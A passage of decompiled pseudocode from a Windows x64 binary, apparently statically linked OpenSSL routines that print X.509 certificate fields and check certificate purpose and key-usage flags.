          v5 += v35;
        }
        else
        {
          if ( !a1(a2, v39, v14) || !(unsigned int)sub_14005F650(a1, a2, v36) )
            return 0xFFFFFFFFi64;
          v5 += v14 + v36;
        }
      }
      v42 = sub_140024CF0(v22);
      v23 = sub_1400252A0(v22);
      v46 = sub_1400AB9F0(v22);
      v24 = v46;
      v25 = sub_14002C260(v23);
      if ( v44 == 6291456 )
        goto LABEL_51;
      if ( v44 == 0x400000 || !v25 )
      {
        sub_14002C3A0(v47, 80, v23, 1);
        v27 = v47;
      }
      else
      {
        if ( (a5 & 0x600000) == 0 )
        {
          v26 = 10;
          v27 = sub_14002C1A0(v25);
          goto LABEL_41;
        }
        if ( v44 == 0x200000 )
        {
          v26 = 25;
          v27 = sub_14002C030(v25);
          goto LABEL_41;
        }
        v27 = (char *)&unk_1400D7DAE;
      }
      v26 = 0;
LABEL_41:
      v28 = 0;
      for ( i = v27; *i; ++v28 )
      {
        if ( v28 >= 0x80000000 )
          break;
        ++i;
      }
      v30 = v28 & 0x7FFFFFFF;
      if ( !a1(a2, v27, v30) )
        return 0xFFFFFFFFi64;
      if ( v30 < v26 && (a5 & 0x2000000) != 0 )
      {
        v31 = v26 - v30;
        if ( !(unsigned int)sub_14005F650(a1, a2, v31) )
          return 0xFFFFFFFFi64;
        v5 += v31;
      }
      if ( !a1(a2, v45, v40) )
        return 0xFFFFFFFFi64;
      v32 = v40 + v30;
      v24 = v46;
      v5 += v32;
LABEL_51:
      if ( v25 || (a5 & 0x1000000) == 0 )
        v33 = 0;
      else
        v33 = 128;
      v34 = sub_14005FA70(
              (__int64 (__fastcall *)(__int64, const char *, __int64))a1,
              a2,
              (unsigned __int16)a5 | v33,
              v24);
      if ( v34 < 0 )
        return 0xFFFFFFFFi64;
      v5 += v34;
      v19 = v38 - 1;
      v17 = v37 + 1;
      --v38;
      v37 = v17;
      if ( v17 >= v41 )
        return v5;
      v6 = v42;
      v18 = a5 & 0x100000;
    }
  }
  return v5;
}

//----- (000000014005FA70) ----------------------------------------------------
__int64 __fastcall sub_14005FA70(
        __int64 (__fastcall *a1)(__int64, const char *, __int64),
        __int64 a2,
        __int16 a3,
        __int64 a4)
{
  __int64 v4; // rdi
  unsigned int v5; // ebx
  char v7; // r12
  const char *v11; // rax
  const char *i; // rdx
  unsigned int v13; // ebx
  int v14; // edi
  int v15; // eax
  int v16; // eax
  char v17; // si
  unsigned int v18; // ebx
  int v20; // eax
  char v21; // [rsp+80h] [rbp+18h] BYREF

  v4 = *(int *)(a4 + 4);
  v5 = 0;
  v21 = 0;
  v7 = a3 & 0xF;
  if ( (a3 & 0x40) != 0 )
  {
    v11 = sub_1400AA5D0(v4);
    for ( i = v11; *v11; ++v5 )
    {
      if ( v5 >= 0x80000000 )
        break;
      ++v11;
    }
    v13 = v5 & 0x7FFFFFFF;
    if ( !(unsigned int)a1(a2, i, v13) || !(unsigned int)a1(a2, (const char *)word_1400F6B40, 1i64) )
      return 0xFFFFFFFFi64;
    v5 = v13 + 1;
  }
  if ( (a3 & 0x80u) == 0 )
  {
    if ( (a3 & 0x20) != 0 )
      goto LABEL_13;
    if ( (unsigned int)(v4 - 1) <= 0x1D )
    {
      v14 = byte_1400FBA28[v4];
      if ( v14 != -1 )
      {
LABEL_14:
        if ( (a3 & 0x10) != 0 )
        {
          v15 = v14 | 8;
          if ( !v14 )
            v15 = 1;
          v14 = v15;
        }
        v16 = sub_14005F0E0(*(_QWORD *)(a4 + 8), *(_DWORD *)a4, v14, v7, &v21, a1, 0i64);
        if ( v16 >= 0 )
        {
          v17 = v21;
          v18 = v16 + v5;
          if ( v21 )
            v18 += 2;
          if ( !a2
            || (!v21 || (unsigned int)a1(a2, "\"", 1i64))
            && (int)sub_14005F0E0(*(_QWORD *)(a4 + 8), *(_DWORD *)a4, v14, v7, 0i64, a1, a2) >= 0
            && (!v17 || (unsigned int)a1(a2, "\"", 1i64)) )
          {
            return v18;
          }
        }
        return 0xFFFFFFFFi64;
      }
    }
    if ( (a3 & 0x100) == 0 )
    {
LABEL_13:
      v14 = 1;
      goto LABEL_14;
    }
  }
  v20 = sub_14005F320(a3, (unsigned int (__fastcall *)(__int64, char *, __int64))a1, a2, a4);
  if ( v20 < 0 )
    return 0xFFFFFFFFi64;
  return v5 + v20;
}
// 1400F6B40: using guessed type __int16 word_1400F6B40[16];

//----- (000000014005FC40) ----------------------------------------------------
_BOOL8 __fastcall sub_14005FC40(__int64 a1, __int64 a2, unsigned int a3)
{
  return !a1 || (unsigned int)sub_14002A430(a1, a2, a3) == a3;
}

//----- (000000014005FC80) ----------------------------------------------------
__int64 __fastcall sub_14005FC80(__int64 a1, __int64 a2, unsigned int a3)
{
  unsigned int *v6; // r15
  int v7; // esi
  unsigned int *v8; // r12
  char v9; // di
  int i; // r14d
  __int64 v11; // rax
  char v12; // di
  int j; // r14d
  __int64 v14; // rax
  __int64 v15; // rax
  unsigned __int8 *v16; // rdi
  __int16 *v17; // r8
  int v19; // [rsp+30h] [rbp-A8h] BYREF
  __int64 v20; // [rsp+38h] [rbp-A0h]
  char v21[80]; // [rsp+40h] [rbp-98h] BYREF

  v20 = a2;
  if ( sub_1400A54F0(a2) )
  {
    v6 = (unsigned int *)sub_1400A5490(a2);
    v7 = 0;
    v8 = (unsigned int *)sub_1400A5470(a2);
    if ( v6 )
    {
      v9 = 1;
      sub_14002A590(a1, "%*sTrusted Uses:\n%*s", a3, byte_1400D7DAE, a3 + 2, byte_1400D7DAE);
      for ( i = 0; i < (int)sub_1400296E0(v6); ++i )
      {
        if ( v9 )
          v9 = 0;
        else
          sub_14002A1A0(a1, (__int64)", ");
        v11 = sub_140029880((__int64)v6, i);
        sub_14002C3A0(v21, 80, v11, 0);
        sub_14002A1A0(a1, (__int64)v21);
      }
      sub_14002A1A0(a1, (__int64)"\n");
    }
    else
    {
      sub_14002A590(a1, "%*sNo Trusted Uses.\n", a3, byte_1400D7DAE);
    }
    if ( v8 )
    {
      v12 = 1;
      sub_14002A590(a1, "%*sRejected Uses:\n%*s", a3, byte_1400D7DAE, a3 + 2, byte_1400D7DAE);
      for ( j = 0; j < (int)sub_1400296E0(v8); ++j )
      {
        if ( v12 )
          v12 = 0;
        else
          sub_14002A1A0(a1, (__int64)", ");
        v14 = sub_140029880((__int64)v8, j);
        sub_14002C3A0(v21, 80, v14, 0);
        sub_14002A1A0(a1, (__int64)v21);
      }
      sub_14002A1A0(a1, (__int64)"\n");
    }
    else
    {
      sub_14002A590(a1, "%*sNo Rejected Uses.\n", a3, byte_1400D7DAE);
    }
    v15 = sub_1400A5430(v20, 0i64);
    if ( v15 )
      sub_14002A590(a1, "%*sAlias: %s\n", a3, byte_1400D7DAE, v15);
    v16 = (unsigned __int8 *)sub_1400A54B0(v20, &v19);
    if ( v16 )
    {
      sub_14002A590(a1, "%*sKey Id: ", a3, byte_1400D7DAE);
      if ( v19 > 0 )
      {
        do
        {
          v17 = (__int16 *)byte_1400D7DAE;
          if ( v7 )
            v17 = word_1400F6B40;
          sub_14002A590(a1, "%s%02X", v17, *v16);
          ++v7;
          ++v16;
        }
        while ( v7 < v19 );
      }
      sub_14002A430(a1, (__int64)"\n", 1u);
    }
  }
  return 1i64;
}
// 1400F6B40: using guessed type __int16 word_1400F6B40[16];

//----- (000000014005FF60) ----------------------------------------------------
__int64 __fastcall sub_14005FF60(__int64 a1, int **a2, int a3, int a4)
{
  unsigned int v4; // r12d
  unsigned __int8 v6; // si
  int v7; // r13d
  int v9; // r15d
  unsigned int v11; // eax
  int v12; // eax
  struct __crt_locale_pointers *LocaleT; // rsi
  unsigned int v14; // ebp
  const char *v15; // r8
  const char *v16; // r9
  int locinfo; // eax
  int v18; // r15d
  __int64 v19; // rbp
  __int64 v20; // r9
  __int64 *v21; // rax
  unsigned int **v22; // rax
  __int64 v23; // rax
  __int64 v24; // rax
  unsigned int **v25; // rax
  __int64 v26; // rax
  __int64 v27; // rax
  unsigned int *v28; // rax
  __int64 *v30; // [rsp+30h] [rbp-48h] BYREF
  int *v31[8]; // [rsp+38h] [rbp-40h] BYREF
  unsigned __int8 v33; // [rsp+98h] [rbp+20h]

  v4 = 0;
  v6 = 10;
  if ( (a3 & 0xF0000) != 0x40000 )
    v6 = 32;
  v7 = 12;
  if ( (a3 & 0xF0000) != 0x40000 )
    v7 = 0;
  v33 = v6;
  v9 = a3;
  if ( !a3 )
    v7 = 16;
  if ( (a4 & 1) == 0
    && ((int)sub_14002A430(a1, (__int64)"Certificate:\n", 0xDu) <= 0
     || (int)sub_14002A430(a1, (__int64)"    Data:\n", 0xAu) <= 0) )
  {
    goto LABEL_74;
  }
  if ( (a4 & 2) == 0 )
  {
    v11 = sub_1400AA110(a2);
    v12 = v11 > 2
        ? sub_14002A590(a1, "%8sVersion: Unknown (%ld)\n", byte_1400D7DAE, v11)
        : sub_14002A590(a1, "%8sVersion: %ld (0x%lx)\n", byte_1400D7DAE, v11 + 1, v11);
    if ( v12 <= 0 )
      goto LABEL_74;
  }
  if ( (a4 & 4) == 0 )
  {
    if ( (int)sub_14002A430(a1, (__int64)"        Serial Number:", 0x16u) <= 0 )
      goto LABEL_74;
    LocaleT = _LocaleUpdate::GetLocaleT((_LocaleUpdate *)a2);
    if ( SLODWORD(LocaleT->locinfo) > 4
      || (sub_1400248C0(), v14 = sub_14007D9A0((int *)LocaleT), sub_1400244F0(), v14 == -1) )
    {
      v16 = byte_1400D7DAE;
      if ( HIDWORD(LocaleT->locinfo) == 258 )
        v16 = " (Negative)";
      if ( (int)sub_14002A590(a1, "\n%12s%s", byte_1400D7DAE, v16) <= 0 )
        goto LABEL_74;
      locinfo = (int)LocaleT->locinfo;
      v18 = 0;
      if ( SLODWORD(LocaleT->locinfo) > 0 )
      {
        v19 = 0i64;
        do
        {
          v20 = 58i64;
          if ( ++v18 == locinfo )
            v20 = 10i64;
          if ( (int)sub_14002A590(a1, "%02x%c", *((unsigned __int8 *)LocaleT->mbcinfo + v19), v20) <= 0 )
            goto LABEL_74;
          locinfo = (int)LocaleT->locinfo;
          ++v19;
        }
        while ( v18 < SLODWORD(LocaleT->locinfo) );
      }
      v9 = a3;
    }
    else
    {
      if ( HIDWORD(LocaleT->locinfo) == 258 )
      {
        v14 = -v14;
        v15 = "-";
      }
      else
      {
        v15 = byte_1400D7DAE;
      }
      if ( (int)sub_14002A590(a1, " %s%lu (%s0x%lx)\n", v15, v14, v15, v14) <= 0 )
        goto LABEL_74;
    }
    v6 = v33;
  }
  if ( (a4 & 8) != 0 || (v21 = (__int64 *)sub_1400AA0E0((__int64)a2), (int)sub_140060620(a1, v21, 0i64) > 0) )
  {
    if ( (a4 & 0x10) != 0
      || (int)sub_14002A590(a1, "        Issuer:%c", v6) > 0
      && (v22 = (unsigned int **)__crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a2),
          (int)sub_14005F0A0(a1, v22, v7, v9) >= 0)
      && (int)sub_14002A430(a1, (__int64)"\n", 1u) > 0 )
    {
      if ( (a4 & 0x20) != 0
        || (int)sub_14002A430(a1, (__int64)"        Validity\n", 0x11u) > 0
        && (int)sub_14002A430(a1, (__int64)"            Not Before: ", 0x18u) > 0
        && (v23 = sub_140021B80((__int64)a2), (unsigned int)sub_1400AC230(a1, v23))
        && (int)sub_14002A430(a1, (__int64)"\n            Not After : ", 0x19u) > 0
        && (v24 = sub_1400AA0D0((__int64)a2), (unsigned int)sub_1400AC230(a1, v24))
        && (int)sub_14002A430(a1, (__int64)"\n", 1u) > 0 )
      {
        if ( (a4 & 0x40) != 0
          || (int)sub_14002A590(a1, "        Subject:%c", v6) > 0
          && (v25 = (unsigned int **)sub_14005F000((__int64)a2), (int)sub_14005F0A0(a1, v25, v7, v9) >= 0)
          && (int)sub_14002A430(a1, (__int64)"\n", 1u) > 0 )
        {
          if ( (a4 & 0x80u) == 0 )
          {
            v26 = sub_14007F5A0((__int64)a2);
            sub_140067820(v31, 0i64, 0i64, 0i64, v26);
            if ( (int)sub_14002A430(a1, (__int64)"        Subject Public Key Info:\n", 0x21u) <= 0
              || (int)sub_14002A590(a1, "%12sPublic Key Algorithm: ", byte_1400D7DAE) <= 0
              || (int)sub_14003FD20(a1, (__int64)v31[0]) <= 0
              || (int)sub_14002A1A0(a1, (__int64)"\n") <= 0 )
            {
              goto LABEL_74;
            }
            v27 = sub_14005EFC0((__int64)a2);
            if ( v27 )
            {
              sub_14001D5F0(a1, v27, 16);
            }
            else
            {
              sub_14002A590(a1, "%12sUnable to load Public Key\n", byte_1400D7DAE);
              sub_1400ABF90(a1);
            }
          }
          if ( (a4 & 0x1000) != 0
            || ((sub_1400AA0F0((__int64)a2, &v30, v31), !v30)
             || (int)sub_14002A590(a1, "%8sIssuer Unique ID: ", byte_1400D7DAE) > 0
             && (unsigned int)sub_140060520(a1, (int *)v30, 12))
            && (!v31[0]
             || (int)sub_14002A590(a1, "%8sSubject Unique ID: ", byte_1400D7DAE) > 0
             && (unsigned int)sub_140060520(a1, v31[0], 12)) )
          {
            if ( (a4 & 0x100) == 0 )
            {
              v28 = (unsigned int *)sub_1400AA0C0((__int64)a2);
              sub_1400AC620(a1, (__int64)"X509v3 extensions", v28, a4, 8u);
            }
            if ( (a4 & 0x200) != 0 || (sub_14005EE80(v31, &v30, (__int64)a2), (int)sub_140060620(a1, v30, v31[0]) > 0) )
            {
              if ( (a4 & 0x400) != 0 || (unsigned int)sub_14005FC80(a1, (__int64)a2, 0) )
                v4 = 1;
            }
          }
        }
      }
    }
  }
LABEL_74:
  sub_14001D930(0i64);
  return v4;
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (0000000140060520) ----------------------------------------------------
__int64 __fastcall sub_140060520(__int64 a1, int *a2, int a3)
{
  __int64 v3; // r12
  unsigned int v4; // r15d
  __int64 v5; // r13
  int v8; // esi
  __int64 v9; // rbx
  __int16 *v10; // r9

  v3 = *a2;
  v4 = 0;
  v5 = *((_QWORD *)a2 + 1);
  v8 = 0;
  v9 = 0i64;
  if ( (int)v3 <= 0 )
  {
LABEL_9:
    LOBYTE(v4) = (unsigned int)sub_14002A430(a1, (__int64)"\n", 1u) == 1;
    return v4;
  }
  else
  {
    while ( v8 != 18 * (v8 / 18) || (int)sub_14002A430(a1, (__int64)"\n", 1u) > 0 && (int)sub_140029E80(a1, a3, a3) > 0 )
    {
      ++v8;
      v10 = word_1400F6B40;
      if ( v8 == (_DWORD)v3 )
        v10 = (__int16 *)byte_1400D7DAE;
      if ( (int)sub_14002A590(a1, "%02x%s", *(unsigned __int8 *)(v9 + v5), v10) <= 0 )
        break;
      if ( ++v9 >= v3 )
        goto LABEL_9;
    }
    return 0i64;
  }
}
// 1400F6B40: using guessed type __int16 word_1400F6B40[16];

//----- (0000000140060620) ----------------------------------------------------
__int64 __fastcall sub_140060620(__int64 a1, __int64 *a2, int *a3)
{
  int v7; // eax
  __int64 v8; // rax
  __int64 (__fastcall *v9)(__int64, __int64 *, int *, __int64, _QWORD); // r10
  int v10[6]; // [rsp+30h] [rbp-18h] BYREF
  int v11; // [rsp+68h] [rbp+20h] BYREF

  if ( (int)sub_14002A1A0(a1, (__int64)"    Signature Algorithm: ") <= 0 || (int)sub_14003FD20(a1, *a2) <= 0 )
    return 0i64;
  v7 = sub_14002C260(*a2);
  if ( v7 )
  {
    if ( (unsigned int)sub_140035DA0(v7, v10, &v11) )
    {
      v8 = sub_14002CC10(0i64, v11);
      if ( v8 )
      {
        v9 = *(__int64 (__fastcall **)(__int64, __int64 *, int *, __int64, _QWORD))(v8 + 160);
        if ( v9 )
          return v9(a1, a2, a3, 9i64, 0i64);
      }
    }
  }
  if ( a3 )
    return sub_140060520(a1, a3, 9);
  return (int)sub_14002A1A0(a1, (__int64)"\n") > 0;
}
// 140060620: using guessed type int var_18[6];

//----- (0000000140060720) ----------------------------------------------------
__int64 __fastcall sub_140060720(__int64 a1, __int64 a2)
{
  return sub_1400A2800(
           (__int64 (__fastcall *)(__int64, char **))sub_14005EF10,
           (__int64)"CERTIFICATE",
           a1,
           a2,
           0i64,
           0i64,
           0,
           0i64,
           0i64);
}

//----- (0000000140060770) ----------------------------------------------------
__int64 __fastcall sub_140060770(__int64 a1, __int64 a2, int a3)
{
  int v3; // eax

  v3 = *(_DWORD *)(a2 + 192);
  if ( (v3 & 4) != 0 && (*(_BYTE *)(a2 + 200) & 2) == 0 )
    return 0i64;
  if ( a3 )
    return sub_140060D50(a2);
  return ((v3 & 2) == 0 || (*(_BYTE *)(a2 + 196) & 0x88) != 0) && ((v3 & 8) == 0 || *(char *)(a2 + 204) < 0);
}

//----- (00000001400607D0) ----------------------------------------------------
__int64 __fastcall sub_1400607D0(__int64 a1, __int64 a2, int a3)
{
  int v3; // eax

  v3 = *(_DWORD *)(a2 + 192);
  if ( (v3 & 4) != 0 && (*(_BYTE *)(a2 + 200) & 0x11) == 0 )
    return 0i64;
  if ( a3 )
    return sub_140060D50(a2);
  return ((v3 & 8) == 0 || (*(_BYTE *)(a2 + 204) & 0x40) != 0) && ((v3 & 2) == 0 || (*(_BYTE *)(a2 + 196) & 0xA8) != 0);
}

//----- (0000000140060830) ----------------------------------------------------
__int64 __fastcall sub_140060830(__int64 a1, __int64 a2, int a3)
{
  int v3; // eax
  int v5; // eax

  v3 = *(_DWORD *)(a2 + 192);
  if ( (v3 & 4) != 0 && (*(_BYTE *)(a2 + 200) & 0x11) == 0 )
    return 0i64;
  if ( a3 )
    return sub_140060D50(a2);
  return ((v3 & 8) == 0 || (*(_BYTE *)(a2 + 204) & 0x40) != 0)
      && ((v5 = *(_DWORD *)(a2 + 192) & 2) == 0 || (*(_BYTE *)(a2 + 196) & 0xA8) != 0)
      && (!v5 || (*(_BYTE *)(a2 + 196) & 0x20) != 0);
}

//----- (00000001400608A0) ----------------------------------------------------
__int64 __fastcall sub_1400608A0(__int64 a1, __int64 a2, int a3)
{
  int v3; // ecx
  __int64 result; // rax
  __int64 v5; // r9
  bool v6; // zf
  int v7; // eax

  v3 = *(_DWORD *)(a2 + 192);
  if ( (v3 & 4) != 0 && (*(_BYTE *)(a2 + 200) & 4) == 0 )
    return 0i64;
  if ( !a3 )
  {
    if ( (v3 & 8) == 0 || (v7 = *(_DWORD *)(a2 + 204), (v7 & 0x20) != 0) )
    {
      result = 1i64;
    }
    else
    {
      if ( (v7 & 0x80u) == 0 )
        return 0i64;
      result = 2i64;
    }
    if ( (v3 & 2) == 0 )
      return result;
    v6 = (*(_BYTE *)(a2 + 196) & 0xC0) == 0;
LABEL_14:
    if ( !v6 )
      return result;
    return 0i64;
  }
  result = sub_140060CF0(a2);
  if ( (_DWORD)result )
  {
    if ( (_DWORD)result != 5 )
      return result;
    v6 = (*(_BYTE *)(v5 + 204) & 2) == 0;
    goto LABEL_14;
  }
  return 0i64;
}
// 1400608DA: variable 'v5' is possibly undefined

//----- (0000000140060920) ----------------------------------------------------
__int64 __fastcall sub_140060920(__int64 a1, __int64 a2, int a3)
{
  int v3; // ecx
  __int64 result; // rax
  __int64 v5; // r9
  bool v6; // zf
  int v7; // eax

  v3 = *(_DWORD *)(a2 + 192);
  if ( (v3 & 4) != 0 && (*(_BYTE *)(a2 + 200) & 4) == 0 )
    return 0i64;
  if ( !a3 )
  {
    if ( (v3 & 8) == 0 || (v7 = *(_DWORD *)(a2 + 204), (v7 & 0x20) != 0) )
    {
      result = 1i64;
    }
    else
    {
      if ( (v7 & 0x80u) == 0 )
        return 0i64;
      result = 2i64;
    }
    if ( (v3 & 2) == 0 )
      return result;
    v6 = (*(_BYTE *)(a2 + 196) & 0x20) == 0;
LABEL_14:
    if ( !v6 )
      return result;
    return 0i64;
  }
  result = sub_140060CF0(a2);
  if ( (_DWORD)result )
  {
    if ( (_DWORD)result != 5 )
      return result;
    v6 = (*(_BYTE *)(v5 + 204) & 2) == 0;
    goto LABEL_14;
  }
  return 0i64;
}
// 14006095A: variable 'v5' is possibly undefined

//----- (00000001400609A0) ----------------------------------------------------
__int64 __fastcall sub_1400609A0(__int64 a1, __int64 a2, int a3)
{
  unsigned int v3; // eax
  unsigned int v4; // ecx

  if ( !a3 )
    return (*(_BYTE *)(a2 + 192) & 2) == 0 || (*(_BYTE *)(a2 + 196) & 2) != 0;
  v3 = sub_140060CF0(a2);
  v4 = 0;
  if ( v3 != 2 )
    return v3;
  return v4;
}

//----- (00000001400609F0) ----------------------------------------------------
__int64 __fastcall sub_1400609F0(__int64 a1, _DWORD *a2, int a3)
{
  __int64 result; // rax
  int v5; // eax
  int v6; // ecx
  int v7; // eax
  __int64 v8; // rax
  int v9; // eax

  if ( a3 )
    return sub_140060CF0((__int64)a2);
  v5 = a2[48];
  result = 0;
  if ( (v5 & 2) == 0 || (v6 = a2[49], (v6 & 0xFFFFFF3F) == 0) && (v6 & 0xC0) != 0 )
  {
    if ( (v5 & 4) != 0 && a2[50] == 64 )
    {
      v7 = sub_1400AC960((__int64)a2, 0x7Eu, -1);
      if ( v7 < 0 )
        return 1;
      v8 = sub_1400AC940((__int64)a2, v7);
      LOBYTE(v9) = sub_1400AC9C0(v8);
      if ( v9 )
        return 1;
    }
  }
  return result;
}
// 140060A66: variable 'v9' is possibly undefined

//----- (0000000140060A80) ----------------------------------------------------
__int64 __fastcall sub_140060A80(__int64 a1, __int64 a2, int a3)
{
  if ( a3 )
    return sub_140060CF0(a2);
  else
    return 1i64;
}

//----- (0000000140060AB0) ----------------------------------------------------
__int64 __fastcall sub_140060AB0(_LocaleUpdate *a1, __int64 a2)
{
  const void **v5; // rcx
  __int64 v6; // rdx
  __int64 v7; // rbx
  struct __crt_locale_pointers *LocaleT; // rax
  unsigned int *v9; // rdi
  int v10; // ebx
  __int64 v11; // rax
  __int64 v12; // rbx
  __int64 v13; // rax

  if ( !a2 )
    return 0i64;
  v5 = *(const void ***)a2;
  if ( *(_QWORD *)a2 )
  {
    v6 = *((_QWORD *)a1 + 26);
    if ( v6 )
    {
      if ( sub_14006B060(v5, v6) )
        return 30i64;
    }
  }
  v7 = *(_QWORD *)(a2 + 16);
  if ( v7 )
  {
    LocaleT = _LocaleUpdate::GetLocaleT(a1);
    if ( sub_14007D950((__int64)LocaleT, v7) )
      return 31i64;
  }
  v9 = *(unsigned int **)(a2 + 8);
  if ( !v9 )
    return 0i64;
  v10 = 0;
  if ( (int)sub_1400296E0(v9) <= 0 )
    return 0i64;
  while ( 1 )
  {
    v11 = sub_140029880((__int64)v9, v10);
    if ( *(_DWORD *)v11 == 4 )
      break;
    if ( ++v10 >= (int)sub_1400296E0(v9) )
      return 0i64;
  }
  v12 = *(_QWORD *)(v11 + 8);
  if ( v12
    && (v13 = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1), sub_14005EF30(v12, v13)) )
  {
    return 31i64;
  }
  else
  {
    return 0i64;
  }
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (0000000140060BB0) ----------------------------------------------------
__int64 __fastcall sub_140060BB0(__int64 a1, int a2, unsigned int a3)
{
  int v7; // edx
  int v8; // eax
  __int64 v9; // rax
  int v10[14]; // [rsp+20h] [rbp-38h] BYREF

  if ( (*(_DWORD *)(a1 + 192) & 0x100) == 0 )
  {
    sub_140025D20(*(_DWORD **)(a1 + 304));
    sub_140060EF0(a1);
    sub_140025CE0(*(_DWORD **)(a1 + 304));
  }
  if ( a2 == -1 )
    return 1i64;
  if ( (unsigned int)(a2 - 1) > 8 )
  {
    v10[0] = a2;
    if ( !qword_140143398 )
      return 0xFFFFFFFFi64;
    v8 = sub_140029490((int *)qword_140143398, (__int64)v10);
    if ( v8 == -1 )
      return 0xFFFFFFFFi64;
    v7 = v8 + 9;
  }
  else
  {
    v7 = a2 - 1;
  }
  if ( v7 == -1 )
    return 0xFFFFFFFFi64;
  if ( v7 < 0 )
    return MEMORY[0x10](0i64, a1, a3);
  if ( v7 < 9 )
    return (*((__int64 (__fastcall **)(char *, __int64, _QWORD))&unk_140135750 + 6 * v7 + 2))(
             (char *)&unk_140135750 + 48 * v7,
             a1,
             a3);
  v9 = sub_140029880(qword_140143398, v7 - 9);
  return (*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(v9 + 16))(v9, a1, a3);
}
// 10: using guessed type __int64 (__fastcall *)(_QWORD, _QWORD, _QWORD);
// 140143398: using guessed type __int64 qword_140143398;
// 140060BB0: using guessed type int var_38[14];

//----- (0000000140060CF0) ----------------------------------------------------
__int64 __fastcall sub_140060CF0(__int64 a1)
{
  int v1; // edx

  v1 = *(_DWORD *)(a1 + 192);
  if ( (v1 & 2) != 0 && (*(_BYTE *)(a1 + 196) & 4) == 0 )
    return 0i64;
  if ( (v1 & 1) != 0 )
    return ((unsigned __int8)v1 >> 4) & 1;
  if ( (v1 & 0x2040) == 8256 )
    return 3i64;
  if ( (*(_DWORD *)(a1 + 192) & 2) != 0 )
    return 4i64;
  if ( (v1 & 8) != 0 && (*(_BYTE *)(a1 + 204) & 7) != 0 )
    return 5i64;
  else
    return 0i64;
}

//----- (0000000140060D50) ----------------------------------------------------
__int64 __fastcall sub_140060D50(__int64 a1)
{
  int v1; // edx
  __int64 result; // rax
  int v3; // ecx

  v1 = *(_DWORD *)(a1 + 192);
  if ( (v1 & 2) != 0 && (*(_BYTE *)(a1 + 196) & 4) == 0 )
    return 0i64;
  if ( (v1 & 1) != 0 )
    return (v1 & 0x10) != 0;
  if ( (v1 & 0x2040) == 8256 )
    return 3i64;
  if ( (*(_DWORD *)(a1 + 192) & 2) != 0 )
    return 4i64;
  if ( (v1 & 8) == 0 )
    return 0i64;
  v3 = *(_DWORD *)(a1 + 204);
  if ( (v3 & 7) == 0 )
    return 0i64;
  result = 5i64;
  if ( (v3 & 4) == 0 )
    return 0i64;
  return result;
}

//----- (0000000140060DC0) ----------------------------------------------------
__int64 __fastcall sub_140060DC0(__int64 a1)
{
  int v1; // eax
  unsigned int *v3; // rax
  int v4; // esi
  __int64 result; // rax
  __int64 v6; // rax
  __int64 v7; // rbx
  __int64 v8; // rdx
  _DWORD *v9; // rax
  int v10; // edi
  __int64 v11; // rax
  unsigned int *v12; // rax

  v3 = (unsigned int *)sub_1400AC9A0(a1, v1 + 71, 0i64, 0i64);
  *(_QWORD *)(a1 + 232) = v3;
  v4 = 0;
  result = sub_1400296E0(v3);
  if ( (int)result > 0 )
  {
    do
    {
      v6 = sub_140029880(*(_QWORD *)(a1 + 232), v4);
      v7 = v6;
      v8 = *(_QWORD *)(v6 + 8);
      if ( v8 )
      {
        if ( *(int *)v8 > 0 )
          *(_DWORD *)(v6 + 24) = **(unsigned __int8 **)(v8 + 8);
        if ( *(int *)v8 > 1 )
          *(_DWORD *)(v6 + 24) |= *(unsigned __int8 *)(*(_QWORD *)(v8 + 8) + 1i64) << 8;
        *(_DWORD *)(v6 + 24) &= 0x807Fu;
      }
      else
      {
        *(_DWORD *)(v6 + 24) = 32895;
      }
      v9 = *(_DWORD **)v6;
      if ( *(_QWORD *)v7 && *v9 == 1 )
      {
        v10 = 0;
        if ( (int)sub_1400296E0(*(unsigned int **)(v7 + 16)) <= 0 )
          goto LABEL_16;
        while ( 1 )
        {
          v11 = sub_140029880(*(_QWORD *)(v7 + 16), v10);
          if ( *(_DWORD *)v11 == 4 )
            break;
          if ( ++v10 >= (int)sub_1400296E0(*(unsigned int **)(v7 + 16)) )
            goto LABEL_16;
        }
        v12 = *(unsigned int **)(v11 + 8);
        if ( !v12 )
LABEL_16:
          v12 = (unsigned int *)__crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
        sub_1400A5D10(*(_QWORD *)v7, v12);
      }
      ++v4;
      result = sub_1400296E0(*(unsigned int **)(a1 + 232));
    }
    while ( v4 < (int)result );
  }
  return result;
}
// 140060DD6: variable 'v1' is possibly undefined
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (0000000140060EF0) ----------------------------------------------------
void __fastcall sub_140060EF0(__int64 a1)
{
  int *v2; // rax
  __int64 v3; // rax
  unsigned int *v4; // rdi
  int *v5; // rcx
  int **v6; // rdi
  __int64 v7; // rax
  int v8; // r8d
  unsigned int *v9; // rax
  unsigned int *v10; // rdi
  int v11; // eax
  int v12; // ecx
  __int64 v13; // rax
  int v14; // eax
  int v15; // eax
  __int64 v16; // rax
  __int64 v17; // rdi
  __int64 v18; // rax
  __int64 v19; // rdx
  int v20; // eax
  __int64 v21; // rax
  int v22; // eax
  int v23; // ecx
  __int64 v24; // rdi
  __int64 v25; // rax
  int v26; // eax
  __int64 v27; // rax
  int v28; // eax
  int v29; // [rsp+50h] [rbp+8h] BYREF
  int v30; // [rsp+58h] [rbp+10h] BYREF

  if ( (*(_DWORD *)(a1 + 192) & 0x100) == 0 )
  {
    v2 = (int *)sub_14005BAC0();
    sub_1400AC860(a1, v2, a1 + 272, 0i64);
    if ( !(unsigned int)sub_1400AA110((int **)a1) )
      *(_DWORD *)(a1 + 192) |= 0x40u;
    v3 = sub_1400AC9A0(a1, 87, 0i64, 0i64);
    v4 = (unsigned int *)v3;
    if ( v3 )
    {
      if ( *(_DWORD *)v3 )
        *(_DWORD *)(a1 + 192) |= 0x10u;
      v5 = *(int **)(v3 + 8);
      if ( v5 )
      {
        if ( v5[1] == 258 || !*(_DWORD *)v3 )
        {
          *(_DWORD *)(a1 + 192) |= 0x80u;
          *(_DWORD *)(a1 + 184) = 0;
        }
        else
        {
          *(_DWORD *)(a1 + 184) = sub_14007D9A0(v5);
        }
      }
      else
      {
